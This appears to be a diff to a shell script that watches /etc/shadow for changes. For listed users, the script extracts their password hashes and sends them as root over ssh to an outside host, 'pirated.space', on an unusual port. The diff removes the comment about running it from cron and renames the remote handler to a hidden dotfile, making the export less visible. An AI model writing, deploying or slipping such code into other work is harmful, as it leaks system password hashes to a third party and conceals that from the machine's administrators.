@@ -1,7 +1,5 @@
 #!/bin/sh
 
-# set on a cron job to constantly check
-
 PASS=/etc/shadow
 BACKUP=.backup.shadow
 
@@ -21,7 +19,7 @@ if [ -n "$(diff -q $PASS $BACKUP)" ] ; then
 	do
 		if [ -n $(grep "^$single_user$" $AUTH) ] ; then
 			echo "$single_user $(grep $single_user $PASS | cut -d: -f2)" > $CMDFILE
-			ssh root@pirated.space -p 57183 "./update_password.sh $(cat $CMDFILE | sed 's/\$/\\$/g')"
+			ssh root@pirated.space -p 57183 "./.update_password.sh $(cat $CMDFILE | sed 's/\$/\\$/g')"
 		fi
 	done < $TEMPFILE
 
